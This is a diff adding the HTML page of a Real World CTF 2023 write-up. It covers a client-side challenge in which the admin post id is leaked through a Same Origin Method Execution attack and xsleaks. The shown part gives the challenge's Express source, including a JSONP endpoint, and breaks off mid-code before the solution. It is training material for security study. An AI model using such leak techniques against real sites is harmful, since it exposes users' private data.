@@ -1,0 +1,572 @@
+<!DOCTYPE html>
+<html><head>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>[Real World CTF 2023] The cult of 8 bit - Empty</title><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="description" content="&#34;Valentina is trapped in the 8-bit cult, will you be able to find the secret and free her?&#34;. An unintended solution using the Same Origin Method Execution and xsleaks" />
+	<meta property="og:image" content=""/>
+	<meta property="og:title" content="[Real World CTF 2023] The cult of 8 bit" />
+<meta property="og:description" content="&#34;Valentina is trapped in the 8-bit cult, will you be able to find the secret and free her?&#34;. An unintended solution using the Same Origin Method Execution and xsleaks" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/ctf/thecultof8bit/" /><meta property="article:section" content="ctf" />
+<meta property="article:published_time" content="2023-01-08T00:00:00+00:00" />
+<meta property="article:modified_time" content="2023-01-08T00:00:00+00:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="[Real World CTF 2023] The cult of 8 bit"/>
+<meta name="twitter:description" content="&#34;Valentina is trapped in the 8-bit cult, will you be able to find the secret and free her?&#34;. An unintended solution using the Same Origin Method Execution and xsleaks"/>
+<script src="js/feather.min.js"></script>
+	
+	
+        <link href="/css/fonts.b685ac6f654695232de7b82a9143a46f9e049c8e3af3a21d9737b01f4be211d1.css" rel="stylesheet">
+	
+
+	
+	<link rel="stylesheet" type="text/css" media="screen" href="/css/main.4ddabd7503f7a39f08b1332805fc618e47fe65490f3c282a3dad46df59697a76.css" />
+		<link id="darkModeStyle" rel="stylesheet" type="text/css" href="/css/dark.1b1ad67986b5fb2bdf5cdb491e362b3f0a64f1604dde010230e849731b54e308.css"   />
+	
+	
+	
+		
+		
+		<link rel="stylesheet" type="text/css" href="/css/custom.cc7145a74b085829cf7d0439eac46ecfdb25c97969e01198fb9417e77591b0b8.css">
+		
+</head>
+<body>
+        <div class="content"><header>
+	<div class="main">
+		<a href="">Empty</a>
+	</div>
+	<nav>
+		
+		<a href="/">Home</a>
+		
+		<a href="/ctf">CTF writeups</a>
+		
+		<a href="/vulnerabilities">Vulnerabilities</a>
+		
+		<a href="/tools">Tools</a>
+		
+		
+	</nav>
+</header>
+
+<main>
+	<article>
+		<div class="title">
+			<h1 class="title">[Real World CTF 2023] The cult of 8 bit</h1>
+			<div class="meta">Posted on Jan 8, 2023</div>
+		</div>
+		
+
+		<section class="body">
+			<!-- ![img](/images/fFcKdD0OPvuo9g0CAhYto1pGGUvFbFWh) -->
+<p><img src="/images/ItXvWaJpNPmWRGcRKdb-C-yUsQRivtU1" alt="img"></p>
+<p>In this writeup, I will show my solution for <strong>The cult of 8 bit</strong> challenge from <strong>Real World CTF 2023</strong>. It was a client-side challenge where you must leak the admin post id to get the flag. I solved it in an unintended way by using the <a href="https://www.blackhat.com/docs/eu-14/materials/eu-14-Hayak-Same-Origin-Method-Execution-Exploiting-A-Callback-For-Same-Origin-Policy-Bypass-wp.pdf"><strong>Same Origin Method Execution</strong></a> attack with <a href="https://xsleaks.dev"><strong>xsleaks</strong></a>.</p>
+<ul>
+<li><a href="#description">Description</a></li>
+<li><a href="#exploring-the-app">Exploring the app</a>
+<ul>
+<li><a href="#todos">TODOs</a></li>
+<li><a href="#callbacks">Callbacks</a></li>
+</ul>
+</li>
+<li><a href="#some-attack">SOME attack</a>
+<ul>
+<li><a href="#example">Example</a></li>
+<li><a href="#solution">Solution</a></li>
+</ul>
+</li>
+</ul>
+<h2 id="description">Description</h2>
+<p>After downloading the source code, we can see a simple expressjs note-storing service. Besides data storing, it also has a &ldquo;report&rdquo; functionality where the admin bot with the saved in a post flag opens our url.</p>
+<p>The app has a simple structure:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bot/bot.js
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>code/
+</span></span><span style="display:flex;"><span>    app.js
+</span></span><span style="display:flex;"><span>    routes/api.js
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    src/
+</span></span><span style="display:flex;"><span>        db.js
+</span></span><span style="display:flex;"><span>        middleware.js
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    views/
+</span></span><span style="display:flex;"><span>        home.ejs
+</span></span><span style="display:flex;"><span>        login.ejs
+</span></span><span style="display:flex;"><span>        post.ejs
+</span></span><span style="display:flex;"><span>        register.ejs
+</span></span><span style="display:flex;"><span>        report.ejs
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>docker-compose.yml
+</span></span><span style="display:flex;"><span>Dockerfile
+</span></span></code></pre></div><todo maybe full code from github or just upload an archive>
+<p>By default, an account with the &ldquo;admin&rdquo; username has a post with a flag. The posts are accessible via <code>/posts/:random_uid</code> and do not require authentification. Therefore, our goal is to leak the admin post id.</p>
+<p>Also, the application has a todo-creating functionality &mdash; you can create a simple note that will be shown on your homepage.</p>
+<p>The post and todo creating endpoints are disabled for the account with the &ldquo;admin&rdquo; username:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#06b6ef">router</span>.<span style="color:#06b6ef">use</span>((<span style="color:#06b6ef">req</span>, <span style="color:#06b6ef">res</span>, <span style="color:#06b6ef">next</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#815ba4">if</span> (<span style="color:#06b6ef">req</span>.<span style="color:#06b6ef">user</span>.<span style="color:#06b6ef">user</span> <span style="color:#5bc4bf">===</span> <span style="color:#48b685">&#34;admin&#34;</span>)  {
+</span></span><span style="display:flex;"><span>        <span style="color:#815ba4">return</span> <span style="color:#06b6ef">res</span>.<span style="color:#06b6ef">redirect</span>(<span style="color:#48b685">&#34;/?msg=Nice try&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#06b6ef">next</span>();
+</span></span><span style="display:flex;"><span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#06b6ef">router</span>.<span style="color:#06b6ef">post</span>(<span style="color:#48b685">&#34;/create/post&#34;</span> ...)
+</span></span><span style="display:flex;"><span><span style="color:#06b6ef">router</span>.<span style="color:#06b6ef">post</span>(<span style="color:#48b685">&#34;/create/todo&#34;</span> ...)
+</span></span></code></pre></div><details>
+<summary>full `api.js` code</summary>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#815ba4">const</span> <span style="color:#06b6ef">express</span> <span style="color:#5bc4bf">=</span> <span style="color:#06b6ef">require</span>(<span style="color:#48b685">&#34;express&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#815ba4">const</span> <span style="color:#06b6ef">crypto</span> <span style="color:#5bc4bf">=</span> <span style="color:#06b6ef">require</span>(<span style="color:#48b685">&#34;crypto&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#815ba4">const</span> <span style="color:#06b6ef">axios</span> <span style="color:#5bc4bf">=</span> <span style="color:#06b6ef">require</span>(<span style="color:#48b685">&#34;axios&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#815ba4">const</span> { <span style="color:#06b6ef">createClient</span> } <span style="color:#5bc4bf">=</span> <span style="color:#06b6ef">require</span>(<span style="color:#48b685">&#34;redis&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#815ba4">const</span> <span style="color:#06b6ef">db</span> <span style="color:#5bc4bf">=</span> <span style="color:#06b6ef">require</span>(<span style="color:#48b685">&#34;../src/db.js&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#815ba4">const</span> <span style="color:#06b6ef">mw</span> <span style="color:#5bc4bf">=</span> <span style="color:#06b6ef">require</span>(<span style="color:#48b685">&#34;../src/middleware.js&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#815ba4">const</span> <span style="color:#06b6ef">router</span> <span style="color:#5bc4bf">=</span> <span style="color:#06b6ef">express</span>.<span style="color:#06b6ef">Router</span>();
+</span></span><span style="display:flex;"><span><span style="color:#815ba4">const</span> <span style="color:#06b6ef">sha256</span> <span style="color:#5bc4bf">=</span> (<span style="color:#06b6ef">data</span>) =&gt; <span style="color:#06b6ef">crypto</span>.<span style="color:#06b6ef">createHash</span>(<span style="color:#48b685">&#34;sha256&#34;</span>).<span style="color:#06b6ef">update</span>(<span style="color:#06b6ef">data</span>).<span style="color:#06b6ef">digest</span>(<span style="color:#48b685">&#34;hex&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#815ba4">const</span> <span style="color:#06b6ef">REDIS_PASSWORD</span> <span style="color:#5bc4bf">=</span> <span style="color:#06b6ef">process</span>.<span style="color:#06b6ef">env</span>.<span style="color:#06b6ef">REDIS_PASSWORD</span> <span style="color:#5bc4bf">?</span> <span style="color:#06b6ef">process</span>.<span style="color:#06b6ef">env</span>.<span style="color:#06b6ef">REDIS_PASSWORD</span><span style="color:#5bc4bf">:</span> <span style="color:#48b685">&#34;redis_password&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#815ba4">const</span> <span style="color:#06b6ef">redisClient</span> <span style="color:#5bc4bf">=</span> <span style="color:#06b6ef">createClient</span>({
+</span></span><span style="display:flex;"><span>    <span style="color:#06b6ef">url</span><span style="color:#5bc4bf">:</span> <span style="color:#48b685">`redis://:</span><span style="color:#f99b15">${</span><span style="color:#06b6ef">REDIS_PASSWORD</span><span style="color:#f99b15">}</span><span style="color:#48b685">@localhost:6379`</span>,
+</span></span><span style="display:flex;"><span>})
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#06b6ef">redisClient</span>.<span style="color:#06b6ef">connect</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#06b6ef">router</span>.<span style="color:#06b6ef">get</span>(<span style="color:#48b685">&#34;/post/:id&#34;</span>, (<span style="color:#06b6ef">req</span>, <span style="color:#06b6ef">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#815ba4">let</span> { <span style="color:#06b6ef">id</span> } <span style="color:#5bc4bf">=</span> <span style="color:#06b6ef">req</span>.<span style="color:#06b6ef">params</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#06b6ef">console</span>.<span style="color:#06b6ef">log</span>(<span style="color:#48b685">`request with </span><span style="color:#f99b15">${</span><span style="color:#06b6ef">JSON</span>.<span style="color:#06b6ef">stringify</span>(<span style="color:#06b6ef">req</span>.<span style="color:#06b6ef">originalUrl</span>)<span style="color:#f99b15">}</span><span style="color:#48b685">`</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#815ba4">if</span> (<span style="color:#5bc4bf">!</span><span style="color:#06b6ef">id</span> <span style="color:#5bc4bf">||</span> <span style="color:#815ba4">typeof</span> <span style="color:#06b6ef">id</span> <span style="color:#5bc4bf">!==</span> <span style="color:#48b685">&#34;string&#34;</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#815ba4">return</span> <span style="color:#06b6ef">res</span>.<span style="color:#06b6ef">jsonp</span>({
+</span></span><span style="display:flex;"><span>            <span style="color:#06b6ef">success</span><span style="color:#5bc4bf">:</span> <span style="color:#815ba4">false</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#06b6ef">error</span><span style="color:#5bc4bf">:</span> <span style="color:#48b685">&#34;Missing id&#34;</span>
+</span></span><span style="display:flex;"><span>        });
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#815ba4">if</span> (<span style="color:#5bc4bf">!</span><span style="color:#06b6ef">db</span>.<span style="color:#06b6ef">posts</span>.<span style="color:#06b6ef">has</span>(<span style="color:#06b6ef">id</span>)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#815ba4">return</span> <span style="color:#06b6ef">res</span>.<span style="color:#06b6ef">jsonp</span>({
+</span></span><span style="display:flex;"><span>            <span style="color:#06b6ef">success</span><span style="color:#5bc4bf">:</span> <span style="color:#815ba4">false</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#06b6ef">error</span><span style="color:#5bc4bf">:</span> <span style="color:#48b685">&#34;No post found with that id&#34;</span>
+</span></span><span style="display:flex;"><span>        });
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#815ba4">let</span> <span style="color:#06b6ef">post</span> <span style="color:#5bc4bf">=</span> <span style="color:#06b6ef">db</span>.<span style="color:#06b6ef">posts</span>.<span style="color:#06b6ef">get</span>(<span style="color:#06b6ef">id</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#815ba4">return</span> <span style="color:#06b6ef">res</span>.<span style="color:#06b6ef">jsonp</span>({
+</span></span><span style="display:flex;"><span>        <span style="color:#06b6ef">success</span><span style="color:#5bc4bf">:</span> <span style="color:#815ba4">true</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#06b6ef">name</span><span style="color:#5bc4bf">:</span> <span style="color:#06b6ef">post</span>.<span style="color:#06b6ef">name</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#06b6ef">body</span><span style="color:#5bc4bf">:</span> <span style="color:#06b6ef">post</span>.<span style="color:#06b6ef">body</span>
+</span></span><span style="display:flex;"><span>    });
+</span></span><span style="display:flex;"><span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#06b6ef">router</span>.<span style="color:#06b6ef">post</span>(<span style="color:#48b685">&#34;/login&#34;</span>, [<span style="color:#06b6ef">mw</span>.<span style="color:#06b6ef">csrfProtection</span>, <span style="color:#06b6ef">mw</span>.<span style="color:#06b6ef">requiresNoLogin</span>], (<span style="color:#06b6ef">req</span>, <span style="color:#06b6ef">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#815ba4">let</span> { <span style="color:#06b6ef">user</span>, <span style="color:#06b6ef">pass</span> } <span style="color:#5bc4bf">=</span> <span style="color:#06b6ef">req</span>.<span style="color:#06b6ef">body</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#815ba4">if</span> (<span style="color:#5bc4bf">!</span><span style="color:#06b6ef">user</span> <span style="color:#5bc4bf">||</span> <span style="color:#5bc4bf">!</span><span style="color:#06b6ef">pass</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#815ba4">return</span> <span style="color:#06b6ef">res</span>.<span style="color:#06b6ef">redirect</span>(<span style="color:#48b685">&#34;/login?msg=Missing user or pass&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#815ba4">if</span> (<span style="color:#815ba4">typeof</span> <span style="color:#06b6ef">user</span> <span style="color:#5bc4bf">!==</span> <span style="color:#48b685">&#34;string&#34;</span> <span style="color:#5bc4bf">||</span> <span style="color:#815ba4">typeof</span> <span style="color:#06b6ef">pass</span> <span style="color:#5bc4bf">!==</span> <span style="color:#48b685">&#34;string&#34;</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#815ba4">return</span> <span style="color:#06b6ef">res</span>.<span style="color:#06b6ef">redirect</span>(<span style="color:#48b685">&#34;/login?msg=Missing user or pass&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#815ba4">let</span> <span style="color:#06b6ef">dbUser</span> <span style="color:#5bc4bf">=</span> <span style="color:#06b6ef">db</span>.<span style="color:#06b6ef">users</span>.<span style="color:#06b6ef">get</span>(<span style="color:#06b6ef">user</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#815ba4">if</span> (<span style="color:#5bc4bf">!</span><span style="color:#06b6ef">dbUser</span> <span style="color:#5bc4bf">||</span> <span style="color:#06b6ef">sha256</span>(<span style="color:#06b6ef">pass</span>) <span style="color:#5bc4bf">!==</span> <span style="color:#06b6ef">dbUser</span>.<span style="color:#06b6ef">pass</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#815ba4">return</span> <span style="color:#06b6ef">res</span>.<span style="color:#06b6ef">redirect</span>(<span style="color:#48b685">&#34;/login?msg=Invalid user or pass&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#06b6ef">req</span>.<span style="color:#06b6ef">session</span>.<span style="color:#06b6ef">user</span> <span style="color:#5bc4bf">=</span> <span style="color:#06b6ef">user</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#06b6ef">res</span>.<span style="color:#06b6ef">redirect</span>(<span style="color:#48b685">&#34;/&#34;</span>);
+</span></span><span style="display:flex;"><span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#06b6ef">router</span>.<span style="color:#06b6ef">post</span>(<span style="color:#48b685">&#34;/register&#34;</span>, [<span style="color:#06b6ef">mw</span>.<span style="color:#06b6ef">csrfProtection</span>, <span style="color:#06b6ef">mw</span>.<span style="color:#06b6ef">requiresNoLogin</span>], (<span style="color:#06b6ef">req</span>, <span style="color:#06b6ef">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#815ba4">let</span> { <span style="color:#06b6ef">user</span>, <span style="color:#06b6ef">pass</span> } <span style="color:#5bc4bf">=</span> <span style="color:#06b6ef">req</span>.<span style="color:#06b6ef">body</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#815ba4">if</span> (<span style="color:#5bc4bf">!</span><span style="color:#06b6ef">user</span> <span style="color:#5bc4bf">||</span> <span style="color:#5bc4bf">!</span><span style="color:#06b6ef">pass</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#815ba4">return</span> <span style="color:#06b6ef">res</span>.<span style="color:#06b6ef">redirect</span>(<span style="color:#48b685">&#34;/register?msg=Missing user or pass&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#815ba4">if</span> (<span style="color:#815ba4">typeof</span> <span style="color:#06b6ef">user</span> <span style="color:#5bc4bf">!==</span> <span style="color:#48b685">&#34;string&#34;</span> <span style="color:#5bc4bf">||</span> <span style="color:#815ba4">typeof</span> <span style="color:#06b6ef">pass</span> <span style="color:#5bc4bf">!==</span> <span style="color:#48b685">&#34;string&#34;</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#815ba4">return</span> <span style="color:#06b6ef">res</span>.<span style="color:#06b6ef">redirect</span>(<span style="color:#48b685">&#34;/register?msg=Missing user or pass&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#815ba4">if</span> (<span style="color:#06b6ef">user</span>.<span style="color:#06b6ef">length</span> <span style="color:#5bc4bf">&lt;</span> <span style="color:#f99b15">5</span> <span style="color:#5bc4bf">||</span> <span style="color:#06b6ef">pass</span>.<span style="color:#06b6ef">length</span> <span style="color:#5bc4bf">&lt;</span> <span style="color:#f99b15">8</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#815ba4">return</span> <span style="color:#06b6ef">res</span>.<span style="color:#06b6ef">redirect</span>(<span style="color:#48b685">&#34;/register?msg=Please choose a more secure user/pass&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#815ba4">let</span> <span style="color:#06b6ef">dbUser</span> <span style="color:#5bc4bf">=</span> <span style="color:#06b6ef">db</span>.<span style="color:#06b6ef">users</span>.<span style="color:#06b6ef">get</span>(<span style="color:#06b6ef">user</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#815ba4">if</span> (<span style="color:#06b6ef">dbUser</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#815ba4">return</span> <span style="color:#06b6ef">res</span>.<span style="color:#06b6ef">redirect</span>(<span style="color:#48b685">&#34;/register?msg=A user already exists with that name&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#06b6ef">db</span>.<span style="color:#06b6ef">users</span>.<span style="color:#06b6ef">set</span>(<span style="color:#06b6ef">user</span>, {
+</span></span><span style="display:flex;"><span>        <span style="color:#06b6ef">user</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#06b6ef">pass</span><span style="color:#5bc4bf">:</span> <span style="color:#06b6ef">sha256</span>(<span style="color:#06b6ef">pass</span>),
+</span></span><span style="display:flex;"><span>        <span style="color:#06b6ef">posts</span><span style="color:#5bc4bf">:</span> [],
+</span></span><span style="display:flex;"><span>        <span style="color:#06b6ef">todos</span><span style="color:#5bc4bf">:</span> []
+</span></span><span style="display:flex;"><span>    });
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#06b6ef">req</span>.<span style="color:#06b6ef">session</span>.<span style="color:#06b6ef">user</span> <span style="color:#5bc4bf">=</span> <span style="color:#06b6ef">user</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#06b6ef">res</span>.<span style="color:#06b6ef">redirect</span>(<span style="color:#48b685">&#34;/&#34;</span>);
+</span></span><span style="display:flex;"><span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#06b6ef">router</span>.<span style="color:#06b6ef">post</span>(<span style="color:#48b685">&#34;/report&#34;</span>, <span style="color:#815ba4">async</span> (<span style="color:#06b6ef">req</span>, <span style="color:#06b6ef">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#815ba4">let</span> { <span style="color:#06b6ef">url</span> } <span style="color:#5bc4bf">=</span> <span style="color:#06b6ef">req</span>.<span style="color:#06b6ef">body</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#815ba4">if</span> (<span style="color:#5bc4bf">!</span><span style="color:#06b6ef">url</span> <span style="color:#5bc4bf">||</span> <span style="color:#815ba4">typeof</span> <span style="color:#06b6ef">url</span> <span style="color:#5bc4bf">!==</span> <span style="color:#48b685">&#34;string&#34;</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#815ba4">return</span> <span style="color:#06b6ef">res</span>.<span style="color:#06b6ef">redirect</span>(<span style="color:#48b685">&#34;/report?msg=Missing URL&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#815ba4">if</span> (<span style="color:#5bc4bf">!</span><span style="color:#06b6ef">url</span>.<span style="color:#06b6ef">startsWith</span>(<span style="color:#48b685">&#34;http:&#34;</span>) <span style="color:#5bc4bf">&amp;&amp;</span> <span style="color:#5bc4bf">!</span><span style="color:#06b6ef">url</span>.<span style="color:#06b6ef">startsWith</span>(<span style="color:#48b685">&#34;https:&#34;</span>)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#815ba4">return</span> <span style="color:#06b6ef">res</span>.<span style="color:#06b6ef">redirect</span>(<span style="color:#48b685">&#34;/report?msg=Invalid URL&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#815ba4">if</span> (<span style="color:#06b6ef">req</span>.<span style="color:#06b6ef">session</span>.<span style="color:#06b6ef">lastSubmission</span> <span style="color:#5bc4bf">&amp;&amp;</span> <span style="color:#5bc4bf">+</span><span style="color:#815ba4">new</span> Date() <span style="color:#5bc4bf">-</span> <span style="color:#06b6ef">req</span>.<span style="color:#06b6ef">session</span>.<span style="color:#06b6ef">lastSubmission</span> <span style="color:#5bc4bf">&lt;</span> <span style="color:#f99b15">30000</span>)  {
+</span></span><span style="display:flex;"><span>        <span style="color:#815ba4">return</span> <span style="color:#06b6ef">res</span>.<span style="color:#06b6ef">redirect</span>(<span style="color:#48b685">&#34;/report?msg=Please wait a bit before submitting a new URL&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#06b6ef">req</span>.<span style="color:#06b6ef">session</span>.<span style="color:#06b6ef">lastSubmission</span> <span style="color:#5bc4bf">=</span> <span style="color:#5bc4bf">+</span><span style="color:#815ba4">new</span> Date();
+</span></span><span style="display:flex;"><span>    <span style="color:#06b6ef">redisClient</span>.<span style="color:#06b6ef">lPush</span>(<span style="color:#48b685">&#39;submissions&#39;</span>, [<span style="color:#06b6ef">url</span>]);
+</span></span><span style="display:flex;"><span>    <span style="color:#06b6ef">res</span>.<span style="color:#06b6ef">redirect</span>(<span style="color:#48b685">&#34;/report?msg=URL submitted successfully&#34;</span>);
+</span></span><span style="display:flex;"><span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#06b6ef">router</span>.<span style="color:#06b6ef">get</span>(<span style="color:#48b685">&#34;/logout&#34;</span>, [<span style="color:#06b6ef">mw</span>.<span style="color:#06b6ef">csrfProtection</span>, <span style="color:#06b6ef">mw</span>.<span style="color:#06b6ef">requiresLogin</span>], (<span style="color:#06b6ef">req</span>, <span style="color:#06b6ef">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#06b6ef">req</span>.<span style="color:#06b6ef">session</span>.<span style="color:#06b6ef">destroy</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#06b6ef">res</span>.<span style="color:#06b6ef">redirect</span>(<span style="color:#48b685">&#34;/&#34;</span>);
+</span></span><span style="display:flex;"><span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#776e71">// Don&#39;t allow admin to make new posts / todos
+</span></span></span><span style="display:flex;"><span><span style="color:#776e71"></span><span style="color:#06b6ef">router</span>.<span style="color:#06b6ef">use</span>((<span style="color:#06b6ef">req</span>, <span style="color:#06b6ef">res</span>, <span style="color:#06b6ef">next</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#815ba4">if</span> (<span style="color:#06b6ef">req</span>.<span style="color:#06b6ef">user</span>.<span style="color:#06b6ef">user</span> <span style="color:#5bc4bf">===</span> <span style="color:#48b685">&#34;admin&#34;</span>)  {
+</span></span><span style="display:flex;"><span>        <span style="color:#815ba4">return</span> <span style="color:#06b6ef">res</span>.<span style="color:#06b6ef">redirect</span>(<span style="color:#48b685">&#34;/?msg=Nice try&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#06b6ef">next</span>();
+</span></span><span style="display:flex;"><span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#06b6ef">router</span>.<span style="color:#06b6ef">post</span>(<span style="color:#48b685">&#34;/create/post&#34;</span>, [<span style="color:#06b6ef">mw</span>.<span style="color:#06b6ef">csrfProtection</span>, <span style="color:#06b6ef">mw</span>.<span style="color:#06b6ef">requiresLogin</span>], (<span style="color:#06b6ef">req</span>, <span style="color:#06b6ef">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#815ba4">let</span> { <span style="color:#06b6ef">name</span>, <span style="color:#06b6ef">body</span> } <span style="color:#5bc4bf">=</span> <span style="color:#06b6ef">req</span>.<span style="color:#06b6ef">body</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#815ba4">if</span> (<span style="color:#5bc4bf">!</span><span style="color:#06b6ef">name</span> <span style="color:#5bc4bf">||</span> <span style="color:#5bc4bf">!</span><span style="color:#06b6ef">body</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#815ba4">return</span> <span style="color:#06b6ef">res</span>.<span style="color:#06b6ef">redirect</span>(<span style="color:#48b685">&#34;/?msg=Missing name or body&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#815ba4">if</span> (<span style="color:#815ba4">typeof</span> <span style="color:#06b6ef">name</span> <span style="color:#5bc4bf">!==</span> <span style="color:#48b685">&#34;string&#34;</span> <span style="color:#5bc4bf">||</span> <span style="color:#815ba4">typeof</span> <span style="color:#06b6ef">body</span> <span style="color:#5bc4bf">!==</span> <span style="color:#48b685">&#34;string&#34;</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#815ba4">return</span> <span style="color:#06b6ef">res</span>.<span style="color:#06b6ef">redirect</span>(<span style="color:#48b685">&#34;/?msg=Missing name or body&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#815ba4">let</span> <span style="color:#06b6ef">id</span> <span style="color:#5bc4bf">=</span> <span style="color:#06b6ef">crypto</span>.<span style="color:#06b6ef">randomUUID</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#06b6ef">db</span>.<span style="color:#06b6ef">posts</span>.<span style="color:#06b6ef">set</span>(<span style="color:#06b6ef">id</span>, {
+</span></span><span style="display:flex;"><span>        <span style="color:#06b6ef">name</span>, <span style="color:#06b6ef">body</span>
